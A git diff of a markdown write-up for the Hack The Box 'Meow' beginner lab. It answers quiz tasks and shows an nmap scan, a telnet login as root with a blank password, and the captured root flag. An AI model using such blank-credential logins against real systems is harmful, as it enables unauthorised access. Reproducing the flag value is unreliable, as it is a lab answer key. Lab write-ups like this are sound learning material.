@@ -5,28 +5,28 @@
 
 ##### TASK 1
 #### What does the acronym VM stand for?
-#### ```  VIRTUAL MACHINE ```
+### ```  VIRTUAL MACHINE ```
 
 
 ##### TASK 2
 #### What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
-#### ```  TERMINAL ```
+### ```  TERMINAL ```
 
 ##### TASK 3
 #### What service do we use to form our VPN connection into HTB labs?
-#### ```  openvpn ```
+### ```  openvpn ```
 
 ##### TASK 4
 #### What tool do we use to test our connection to the target with an ICMP echo request?
-#### ```  ping  ```
+### ```  ping  ```
 
 ##### TASK 5
 #### What is the name of the most common tool for finding open ports on a target?
-#### ```  nmap ```
+### ```  nmap ```
 
 ##### TASK 6
 #### What service do we identify on port 23/tcp during our scans?
-#### ```  Here we will start Enumerating
+###   Here we will start Enumerating
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV -sC 10.129.36.234                             
@@ -42,4 +42,42 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds
 
 
+```
+
+##### TASK 7
+#### What username is able to log into the target over telnet with a blank password?
+### ``` root```
+```  
+
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.129.36.234                                                                  
+Trying 10.129.36.234...
+Connected to 10.129.36.234.
+Escape character is '^]'.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login: root
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+
+
+
+```
+
+##### TASK 8
+#### Submit root flag
+### 
+
+```
+
+Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
+root@Meow:~# ls
+flag.txt  snap
+root@Meow:~# cat flag.txt
+b40abdfe23665f766f9c61ecba8a4c19
+root@Meow:~# 
 ```
